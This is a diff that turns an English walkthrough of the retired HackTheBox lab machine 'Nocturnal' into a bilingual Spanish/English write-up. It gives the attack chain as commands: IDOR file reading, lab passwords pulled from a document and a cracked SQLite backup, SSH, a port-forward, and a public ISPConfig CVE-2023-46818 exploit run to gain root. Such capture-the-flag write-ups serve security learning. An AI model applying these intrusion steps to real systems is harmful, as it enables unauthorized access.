@@ -1,85 +1,150 @@
- 1, Port scan
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
-|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
-|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
-80/tcp open  http    nginx 1.18.0 (Ubuntu)
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://nocturnal.htb/
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+# Nocturnal [Easy]
 
+> **ES:** Máquina Linux con app PHP de subida de ficheros: IDOR para leer documentos ajenos, backup con SQLite, hashes craqueados y root vía ISPConfig.
+> **EN:** Linux machine with a PHP file-upload app: IDOR to read others' documents, backup with SQLite, cracked hashes, and root via ISPConfig.
+
+| Campo | Valor |
+|-------|-------|
+| **Dificultad** | Easy |
+| **OS** | Linux |
+| **Estado** | Retired |
+| **Maker** | FisMatHack |
+| **URL** | https://app.hackthebox.com/machines/Nocturnal |
+| **IP lab** | 10.10.11.64 |
+| **Fecha de resolución** | 2026-09-24 |
+
+---
+
+## 🎯 Objetivo / Goal
+
+> **ES:** Conseguir `user.txt` y `root.txt` vía IDOR (`view.php`) → credencial de `amanda` → panel admin → backup con SQLite → SSH como `tobias` → CVE-2023-46818 en ISPConfig.
+> **EN:** Get `user.txt` and `root.txt` via IDOR (`view.php`) → `amanda`'s credential → admin panel → backup with SQLite → SSH as `tobias` → CVE-2023-46818 in ISPConfig.
+
+---
+
+## 🛠️ Herramientas usadas / Tools used
+
+- [ ] nmap
+- [ ] dirsearch / ffuf (rutas `admin.php`, `backups`, `uploads`, `view.php`)
+- [ ] Burp (IDOR en visor de ficheros)
+- [ ] sqlite3 + hashcat / john (hashes de la DB del backup)
+- [ ] ssh (`tobias`) + port-forward (8080)
+- [ ] exploit ISPConfig CVE-2023-46818 (bipbopbup)
+
+---
+
+## 📋 Pasos / Steps
+
+### Paso 1 — Reconocimiento / Recon
+
+> **ES:** Escaneo de puertos y registro de `nocturnal.htb`; la web redirige por nombre y expone login/registro con subida de ficheros.
+> **EN:** Port scan and registering `nocturnal.htb`; the site redirects by name and exposes login/register with file upload.
+
+```bash
+nmap -sC -sV -p- -oN nmap_init 10.10.11.64
+echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
+curl -i http://10.10.11.64/  # 302 -> http://nocturnal.htb/
 ```
 
-Page check
-![](images/Pasted%20image%2020250415012323.png)Then I have try to use login and register, but seems there is dashboard here, and we can upload a file from that.
-![](images/Pasted%20image%2020250415012604.png)
-![](images/Pasted%20image%2020250415023835.png)
-After upload a pdf file, we can press that name to check the file
-`http://nocturnal.htb/view.php?username=wither&file=test.pdf`
-![](images/Pasted%20image%2020250415024310.png)
-In this place, we can try to ffuf the web-content to check is there anything else here.
-We can get a interesting file here
-`nocturnal.htb/view.php?username=amanda&file=privacy.odt`
-And there are something interesting here
-```
-Dear Amanda,
-Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
-The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
-Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
+**Resultado / Result:** 22/tcp OpenSSH 8.2p1, 80/tcp nginx 1.18.0 → `nocturnal.htb`. Capturas del login/dashboard en `images/` y en `img/image_20250555-095548.png`.
 
-Yours sincerely,
-Nocturnal's IT team
+---
+
+### Paso 2 — Enumeración / Enumeration
+
+> **ES:** Fuzzing web: `login.php`, `register.php`, `admin.php→login.php`, `dashboard.php`, `view.php`, `/backups/` (403), `/uploads*` (403). Se registra un usuario (`1123:1123`) y se prueba la subida: el filtrado es estricto, no es la vía. El visor `view.php?username=<user>&file=<name>` sufre IDOR: cambiando `username` se leen ficheros de otros usuarios.
+> **EN:** Web fuzzing: `login.php`, `register.php`, `admin.php→login.php`, `dashboard.php`, `view.php`, `/backups/` (403), `/uploads*` (403). Register a user (`1123:1123`) and test upload: filtering is strict, not the way in. The viewer `view.php?username=<user>&file=<name>` suffers IDOR: changing `username` reads other users' files.
+
+```bash
+dirsearch -u http://nocturnal.htb/
+# /admin.php -> login.php, /backups (403), /uploads* (403), /view.php -> login.php
+# tras registro+login y subir un pdf:
+# http://nocturnal.htb/view.php?username=wither&file=test.pdf
+# IDOR:
+# http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
 ```
 
-Then we get the valid credit `amanda:arHkG7HAI68X8s1J`
-And after login with this credit, we can access into something new
-![](images/Pasted%20image%2020250415024856.png)
-Then we finally access into the admin page
-![](images/Pasted%20image%2020250415025020.png)
-Then we can also backup the system and download it
-![](images/Pasted%20image%2020250415025302.png)
-We can also check the source code of these services.
-From the backup, we can find a database file here `nocturnal_database.db`
-![](images/Pasted%20image%2020250415025912.png)
-We can find a few hashes here, and only the password of `tobias` could be cracked
-`tobias:slowmotionapocalypse`
-And we can use the ssh to login and get the user shell.
+**Resultado / Result:** El `privacy.odt` de `amanda` contiene password temporal de IT: `amanda : arHkG7HAI68X8s1J` (válida en todos los servicios; credencial de laboratorio retirado). Capturas del visor en `images/`; registro/subida en `img/` (`img/image_20250557-095742.png`, `img/image_20250559-095914.png`).
 
-2, shell as root
-Firstly, I would check the `sudo -l`
-```
-tobias@nocturnal:~$ sudo -l
-[sudo] password for tobias: 
-Sorry, user tobias may not run sudo on nocturnal.
-```
-Then I would continue to check the valid port and services
-```
-tobias@nocturnal:~$ netstat -ntlp
-(Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.)
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      - 
-```
-There is a port 8080 seems like be our targets
-Let's port forwarding to our local machine, then we can check this service
-![](images/Pasted%20image%2020250415134504.png)
-By searching the exploits of `ispconfig`
-we can find something interesting here `ISPConfig - PHP Code Injection (CVE-2023-46818)`
-Then we can also find the exploits script here
-`https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git`
-Then we can run the script 
-`python3 exploit.py http://localhost:8080 admin slowmotionapocalypse`
+---
 
-Finally we can get the root shell.
+### Paso 3 — Acceso inicial (foothold) / Initial access
+
+> **ES:** Con `amanda` se entra al panel admin: permite backup del sistema (descargable) y ver código. Del backup se extrae `nocturnal_database.db` con hashes; solo el de `tobias` se crackea → SSH.
+> **EN:** With `amanda` enter the admin panel: it allows system backup (downloadable) and code view. From the backup extract `nocturnal_database.db` with hashes; only `tobias`'s cracks → SSH.
+
+```bash
+# login como amanda -> panel admin -> descargar backup
+# del backup: nocturnal_database.db
+sqlite3 nocturnal_database.db ".tables"
+sqlite3 nocturnal_database.db "SELECT * FROM users;"
+hashcat hashes.txt rockyou.txt  # solo tobias cae
+ssh tobias@10.10.11.64  # slowmotionapocalypse (credencial de laboratorio retirado)
+```
+
+**Resultado / Result:** Shell como `tobias` por SSH. Capturas del admin/backup/DB en `images/`.
+
+---
+
+### Paso 4 — Usuario (user.txt) / User
+
+> **ES:** El home de `tobias` contiene `user.txt`.
+> **EN:** `tobias`'s home contains `user.txt`.
+
+```bash
+ls -la /home/tobias/
+cat /home/tobias/user.txt  # formato parcial ofuscado
+```
+
+**Resultado / Result:** `user.txt` como `tobias`.
+
+---
+
+### Paso 5 — Root (root.txt) / Privilege escalation
+
+> **ES:** `tobias` no tiene `sudo`. En `netstat` aparece `127.0.0.1:8080` (además de MySQL 3306, SMTP 587, 33060): es ISPConfig. Con port-forward se confirma el panel y se explota `ISPConfig - PHP Code Injection (CVE-2023-46818)` con `admin : slowmotionapocalypse` (reuse de la clave de `tobias`) → shell root.
+> **EN:** `tobias` has no `sudo`. `netstat` shows `127.0.0.1:8080` (plus MySQL 3306, SMTP 587, 33060): it is ISPConfig. Port-forward to confirm the panel and exploit `ISPConfig - PHP Code Injection (CVE-2023-46818)` with `admin : slowmotionapocalypse` (reuse of `tobias`'s password) → root shell.
+
+```bash
+sudo -l  # Sorry, user tobias may not run sudo on nocturnal.
+netstat -ntlp  # 127.0.0.1:8080, 127.0.0.1:3306, 127.0.0.1:587, 127.0.0.1:33060
+ssh -L 8080:127.0.0.1:8080 tobias@10.10.11.64
+# http://localhost:8080 -> ISPConfig. Captura en images/
+git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git
+python3 exploit.py http://localhost:8080 admin slowmotionapocalypse
+whoami  # root
+cat /root/root.txt  # formato parcial ofuscado
+```
+
+**Resultado / Result:** Técnica: RCE en ISPConfig (CVE-2023-46818). Captura del panel en `images/`.
+
+---
+
+## 🧠 Lo aprendido / Learned
+
+> **ES:** IDOR en visores de ficheros (`username` manipulable); backups descargables = código + hashes; reuse de clave de sistema (`tobias` → admin ISPConfig); servicios solo-loopback (8080) vía port-forward; privesc vía app de hosting.
+> **EN:** IDOR in file viewers (manipulable `username`); downloadable backups = code + hashes; system password reuse (`tobias` → ISPConfig admin); loopback-only services (8080) via port-forward; privesc via hosting app.
+
+- [ ] IDOR + backups expuestos (SQLite) para escalar a admin
+- [ ] SQLite + craqueo + SSH (`tobias:slowmotionapocalypse`)
+- [ ] ISPConfig CVE-2023-46818 hacia root
+
+---
+
+## 📚 Fuentes y Referencias / Sources
+
+- **Fuente:** Nota local `index.md` (nota parcial/TODO con capturas en `img/`) — randark/nota migrada
+- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: IDOR `amanda/privacy.odt`, `nocturnal_database.db`, `netstat` 8080, PoC bipbopbup) — wither/nota migrada
+- **Walkthrough de referencia:** HackTheBox | Nocturnal — https://benheater.com/hackthebox-nocturnal — 0xBEN
+- **Referencia técnica:** ISPConfig CVE-2023-46818 PoC — https://github.com/bipbopbup/CVE-2023-46818-python-exploit — bipbopbup
+- **Fecha de acceso:** 2026-09-24
+- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
+
+---
+
+## ⚠️ Aviso Legal / Disclaimer
+
+> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
+> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.
+
+_Fecha de edición: 2026-09-24_
